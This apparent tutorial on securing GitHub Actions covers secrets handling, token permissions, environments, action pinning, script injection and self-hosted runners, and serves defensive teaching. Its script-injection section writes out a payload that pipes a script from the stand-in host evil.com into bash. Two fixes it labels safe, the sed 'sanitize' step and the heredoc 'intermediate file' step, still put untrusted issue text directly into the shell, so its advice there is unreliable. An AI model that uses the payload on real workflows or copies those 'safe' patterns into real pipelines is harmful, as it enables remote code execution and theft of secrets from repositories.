# Authentication & Security - GitHub Actions

Comprehensive guide to security best practices, authentication mechanisms, and protecting your workflows.

---

## 📋 Table of Contents

1. [Security Overview](#security-overview)
2. [Secrets Management](#secrets-management)
3. [GITHUB_TOKEN](#github_token)
4. [Environment Protection](#environment-protection)
5. [Third-Party Actions](#third-party-actions)
6. [Script Injection](#script-injection)
7. [Self-Hosted Runner Security](#self-hosted-runner-security)
8. [Audit and Monitoring](#audit-and-monitoring)
9. [Best Practices](#best-practices)
10. [Common Vulnerabilities](#common-vulnerabilities)

---

## Security Overview

### Threat Model

**What you're protecting:**
- Source code
- Secrets (API keys, tokens, credentials)
- Build artifacts
- Deployment access
- Infrastructure

**Potential threats:**
- Malicious pull requests
- Compromised dependencies
- Script injection attacks
- Secret exposure in logs
- Unauthorized deployments
- Supply chain attacks

### Security Layers

```
┌─────────────────────────────────────────┐
│  1. Repository Access Control           │
│     - Branch protection                 │
│     - Required reviews                  │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  2. Workflow Triggers                   │
│     - Event restrictions                │
│     - Approval gates                    │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  3. Job Permissions                     │
│     - GITHUB_TOKEN scope                │
│     - Secrets access                    │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  4. Runner Isolation                    │
│     - Ephemeral environments            │
│     - Network restrictions              │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  5. Audit Logging                       │
│     - Workflow runs                     │
│     - Secret access                     │
└─────────────────────────────────────────┘
```

---

## Secrets Management

### Creating Secrets

**Repository Level:**
1. Repository → Settings → Secrets and variables → Actions
2. Click "New repository secret"
3. Name: `MY_SECRET` (all caps, underscores)
4. Value: Your secret value
5. Click "Add secret"

**Organization Level:**
1. Organization → Settings → Secrets
2. Available to all repos in org
3. Can restrict to specific repos

**Environment Level:**
1. Repository → Settings → Environments
2. Create/select environment
3. Add environment-specific secrets
4. Requires approval for protection

### Using Secrets in Workflows

**Basic usage:**
```yaml
steps:
  - name: Use secret
    env:
      API_KEY: ${{ secrets.API_KEY }}
    run: |
      echo "Using API key..."
      # Secret is available in environment
```

**DON'T do this (exposes secret):**
```yaml
# ❌ BAD - Secret appears in logs
- run: echo ${{ secrets.API_KEY }}

# ❌ BAD - Secret appears in command
- run: curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" api.example.com
```

**DO this instead:**
```yaml
# ✅ GOOD - Secret in environment variable
- name: Call API
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: |
    curl -H "Authorization: Bearer $API_KEY" api.example.com
```

### Secret Masking

**Automatic masking:**
- GitHub automatically masks secrets in logs
- Looks for exact string matches
- Shows `***` instead of value

**Limitations:**
```yaml
# These might not be masked:
- run: echo "${MY_SECRET}"        # Quoted, might not mask
- run: echo $MY_SECRET | base64   # Transformed, not masked
- run: echo ${MY_SECRET:0:5}      # Substring, not masked
```

**Best practice:**
- Never echo secrets
- Never log secrets
- Never pass as command-line args visible in logs

### Secret Rotation

**Best practices:**
1. **Regular rotation:** Rotate critical secrets every 90 days
2. **Automated:** Use scripts or APIs to rotate
3. **Zero-downtime:** Update secrets without workflow failures
4. **Track:** Document rotation schedule

**Rotation workflow:**
```yaml
name: Rotate Secrets

on:
  schedule:
    - cron: '0 0 1 * *'  # Monthly
  workflow_dispatch:

jobs:
  rotate:
    runs-on: ubuntu-latest
    steps:
      - name: Generate new secret
        id: new-secret
        run: |
          NEW_VALUE=$(openssl rand -base64 32)
          echo "::add-mask::$NEW_VALUE"
          echo "value=$NEW_VALUE" >> $GITHUB_OUTPUT
      
      - name: Update external service
        env:
          OLD_KEY: ${{ secrets.API_KEY }}
          NEW_KEY: ${{ steps.new-secret.outputs.value }}
        run: |
          # Update service with new key
          curl -X POST api.example.com/keys \
            -H "Authorization: Bearer $OLD_KEY" \
            -d "{\"new_key\": \"$NEW_KEY\"}"
      
      - name: Update GitHub secret
        run: |
          # Use GitHub API to update secret
          # Requires PAT with admin:org scope
```

---

## GITHUB_TOKEN

### What is GITHUB_TOKEN?

**Automatically created for each workflow run:**
- Unique per run
- Expires when run completes
- Scoped to repository
- No need to store as secret

### Default Permissions

**Read access to:**
- Repository code
- Commit statuses
- Deployment statuses
- Issues
- Pull requests

**Write access to:**
- None by default (can be configured)

### Configuring Permissions

**Workflow level (all jobs):**
```yaml
name: My Workflow

permissions:
  contents: read        # Read code
  issues: write         # Comment on issues
  pull-requests: write  # Comment on PRs

jobs:
  my-job:
    runs-on: ubuntu-latest
    steps: [...]
```

**Job level (specific job):**
```yaml
jobs:
  read-only:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps: [...]
  
  write-job:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      issues: write
    steps: [...]
```

**Minimal permissions (principle of least privilege):**
```yaml
permissions:
  contents: read  # Only what's needed
```

### Using GITHUB_TOKEN

**Access via secret:**
```yaml
steps:
  - name: Create issue comment
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    run: |
      gh issue comment ${{ github.event.issue.number }} \
        --body "Automated comment"
```

**Or in actions:**
```yaml
- name: Create release
  uses: actions/create-release@v1
  with:
    tag_name: ${{ github.ref }}
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### GITHUB_TOKEN vs Personal Access Token (PAT)

| Feature | GITHUB_TOKEN | PAT |
|---------|--------------|-----|
| **Expires** | After workflow | Manual expiration |
| **Scope** | Single repo | User-level access |
| **Trigger workflows** | No | Yes |
| **Access other repos** | No | Yes (if permitted) |
| **Security** | More secure | Less secure |
| **Use case** | Default choice | Cross-repo, trigger workflows |

**When to use PAT:**
- Triggering other workflows
- Accessing other repositories
- Long-running automation
- Organization-level operations

---

## Environment Protection

### What are Environments?

Environments represent deployment targets:
- production
- staging
- development
- testing

### Environment Protection Rules

**1. Required Reviewers:**
```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
```

**Configuration:**
- Settings → Environments → Select environment
- Add required reviewers (users/teams)
- Workflow waits for approval before running

**2. Wait Timer:**
- Delay deployment by X minutes
- Allows time to catch issues
- Useful for staged rollouts

**3. Deployment Branches:**
- Restrict which branches can deploy
- Example: Only `main` can deploy to production

### Environment Secrets

**Environment-specific secrets:**
```yaml
jobs:
  deploy-staging:
    environment: staging
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}  # staging API_KEY
        run: deploy.sh
  
  deploy-prod:
    environment: production
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}  # production API_KEY
        run: deploy.sh
```

**Hierarchy:**
1. Environment secrets (highest priority)
2. Repository secrets
3. Organization secrets

---

## Third-Party Actions

### Risks

**Using third-party actions introduces:**
- Code execution on your runner
- Access to your repository
- Potential secret exposure
- Supply chain vulnerabilities

### Verification

**Before using an action:**

1. **Check source code:**
   - Review the action's repository
   - Read the code it executes
   - Look for suspicious patterns

2. **Verify publisher:**
   - Official GitHub actions: `actions/*`
   - Verified creators: Blue checkmark
   - Community actions: Review carefully

3. **Check popularity:**
   - Stars/forks on GitHub
   - Used by many projects
   - Active maintenance

4. **Review permissions:**
   - What does it need access to?
   - Is it asking for too much?

### Pinning Actions

**❌ BAD (uses latest):**
```yaml
uses: actions/checkout@main  # Could change anytime
```

**✅ GOOD (pinned to commit SHA):**
```yaml
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

**Why pin to SHA?**
- Tags can be moved
- Branches can be updated
- SHAs are immutable
- Protects against tag hijacking

**Tools:**
- GitHub Dependabot: Auto-updates pinned actions
- Renovate: Similar automation

### Allow List

**Restrict which actions can be used:**

1. Organization Settings → Actions → General
2. Select "Allow select actions"
3. Specify patterns:
   ```
   actions/*,
   github/*,
   your-org/*
   ```

**Benefits:**
- Prevents use of unvetted actions
- Organizational control
- Reduce attack surface

---

## Script Injection

### The Vulnerability

**Untrusted input in workflows can execute arbitrary code:**

```yaml
# ❌ VULNERABLE
- name: Greet user
  run: echo "Hello ${{ github.event.issue.title }}"
```

**If issue title is:** `"; curl evil.com/steal.sh | bash; echo "`

**Executed command becomes:**
```bash
echo "Hello "; curl evil.com/steal.sh | bash; echo ""
```

### Attack Vectors

**1. Issue/PR titles and bodies:**
```yaml
# ❌ VULNERABLE
run: echo "${{ github.event.issue.body }}"
run: echo "${{ github.event.pull_request.title }}"
```

**2. Branch names:**
```yaml
# ❌ VULNERABLE
run: echo "Branch: ${{ github.head_ref }}"
```

**3. Commit messages:**
```yaml
# ❌ VULNERABLE
run: echo "${{ github.event.head_commit.message }}"
```

### Protection

**✅ Use environment variables:**
```yaml
- name: Greet user (SAFE)
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Hello $TITLE"
```

**✅ Use intermediate files:**
```yaml
- name: Process untrusted input
  run: |
    cat > input.txt << 'EOF'
    ${{ github.event.issue.body }}
    EOF
    
    # Process input.txt safely
    cat input.txt | grep pattern
```

**✅ Sanitize input:**
```yaml
- name: Sanitize and use
  run: |
    SAFE_TITLE=$(echo "${{ github.event.issue.title }}" | sed 's/[^a-zA-Z0-9 ]//g')
    echo "Title: $SAFE_TITLE"
```

### GitHub's Protection

**`pull_request_target` event:**
- Runs in context of base branch
- Has access to secrets
- Code from PR doesn't run automatically

**Use cases:**
- Comment on PRs from forks
- Label PRs automatically
- Run checks that need secrets

**Warning:** Still vulnerable if you checkout PR code!

```yaml
# ⚠️ DANGEROUS with pull_request_target
- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.pull_request.head.sha }}
```

---

## Self-Hosted Runner Security

### Risks

**Self-hosted runners have additional risks:**
- Persistent state between jobs
- Access to your network
- Potential for data exfiltration
- Malicious code can persist

### Isolation Strategies

**1. Ephemeral runners:**
- Destroy after each job
- Use VMs or containers
- Fresh environment each time

**2. Network isolation:**
- Separate network segment
- Firewall rules
- No access to internal services

**3. Least privilege:**
- Run as non-root user
- Minimal file system access
- Read-only mounts where possible

### Recommended Setup

**For public repositories:**
- **Never use self-hosted runners**
- Anyone can fork and run code
- Too risky for persistent runners

**For private repositories:**
- Consider ephemeral runners
- Network isolation
- Regular security audits
- Monitor for anomalies

### Self-Hosted Runner Configuration

```yaml
# Restrict to specific workflows
runs-on: self-hosted
labels: [secure, isolated]
```

**Label strategy:**
- Different runners for different trust levels
- Prod runners: stricter isolation
- Dev runners: more permissive

---

## Audit and Monitoring

### Audit Logs

**Organization level:**
- Settings → Audit log
- Shows all Actions-related events
- API access for programmatic review

**Events logged:**
- Workflow runs
- Secret access
- Runner registration
- Permission changes

### Monitoring Workflows

**Key metrics:**
- Failed workflows (investigate failures)
- Long-running workflows (potential issues)
- Secrets accessed (review patterns)
- Unusual activity (off-hours runs)

**Alerting:**
```yaml
- name: Alert on failure
  if: failure()
  env:
    SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
  run: |
    curl -X POST $SLACK_WEBHOOK \
      -H 'Content-Type: application/json' \
      -d "{\"text\": \"Workflow failed: ${{ github.workflow }}\"}"
```

### Regular Reviews

**Monthly:**
- Review secret access logs
- Check for unused secrets
- Audit third-party actions
- Review failed workflows

**Quarterly:**
- Rotate critical secrets
- Update pinned action versions
- Review runner security
- Security training for team

---

## Best Practices

### 1. Principle of Least Privilege

**Minimal permissions:**
```yaml
permissions:
  contents: read  # Only what you need
```

**Don't do this:**
```yaml
permissions: write-all  # ❌ Too broad
```

### 2. Use Environments

**Protect sensitive deployments:**
```yaml
jobs:
  deploy:
    environment: production  # Requires approval
```

### 3. Pin Action Versions

**Use specific commits:**
```yaml
uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675  # v3.0.0
```

### 4. Separate Workflows

**Different trust levels:**
- CI: Safe, no secrets, run on PRs
- CD: Sensitive, uses secrets, requires approval

### 5. Code Review for Workflows

**Treat .github/workflows/ as critical code:**
- Require reviews for changes
- Security-focused review
- Test changes before merging

### 6. Limit Workflow Scope

**Don't run on all events:**
```yaml
# ❌ Too broad
on: [push, pull_request, issue_comment, ...]

# ✅ Specific
on:
  push:
    branches: [main]
  pull_request:
    types: [opened, synchronize]
```

### 7. Document Secrets

**Maintain a secrets inventory:**
- What each secret is for
- Where it's used
- Rotation schedule
- Who has access

### 8. Security Scanning

**Scan your dependencies:**
```yaml
- name: Run security scan
  uses: github/codeql-action/analyze@v2
```

---

## Common Vulnerabilities

### 1. Secret Exposure

**Problem:**
```yaml
# ❌ Secret appears in logs
- run: echo "API_KEY=${{ secrets.API_KEY }}"
```

**Solution:**
```yaml
# ✅ Use environment variable
- env:
    API_KEY: ${{ secrets.API_KEY }}
  run: echo "Using API key..."
```

### 2. Script Injection

**Problem:**
```yaml
# ❌ Untrusted input in command
- run: echo "${{ github.event.issue.title }}"
```

**Solution:**
```yaml
# ✅ Via environment variable
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

### 3. Excessive Permissions

**Problem:**
```yaml
# ❌ Too many permissions
permissions: write-all
```

**Solution:**
```yaml
# ✅ Minimal permissions
permissions:
  contents: read
  issues: write  # Only what's needed
```

### 4. Unpinned Actions

**Problem:**
```yaml
# ❌ Uses latest (mutable)
uses: actions/checkout@main
```

**Solution:**
```yaml
# ✅ Pinned to SHA
uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675
```

### 5. Persistent Self-Hosted Runners on Public Repos

**Problem:**
- Self-hosted runners on public repos
- Anyone can run malicious code

**Solution:**
- Only use GitHub-hosted for public repos
- Or use ephemeral self-hosted runners

---

## Security Checklist

### Before Merging Workflow Changes

- [ ] Reviewed all code changes
- [ ] Secrets not exposed in logs
- [ ] Minimal permissions granted
- [ ] Actions pinned to SHAs
- [ ] No script injection vulnerabilities
- [ ] Appropriate use of environments
- [ ] Self-hosted runner security considered

### Regular Maintenance

- [ ] Rotate secrets quarterly
- [ ] Update pinned actions monthly
- [ ] Review audit logs monthly
- [ ] Remove unused secrets
- [ ] Document all secrets
- [ ] Security training for team

---

## 📚 Resources

- **GitHub Security Best Practices:** https://docs.github.com/actions/security-guides
- **OWASP GitHub Actions Security:** https://owasp.org/www-project-top-ten-ci-cd-security-risks/
- **Security Hardening:** https://docs.github.com/actions/security-guides/security-hardening-for-github-actions

---

**Last Updated:** October 3, 2025  
**Version:** 1.0
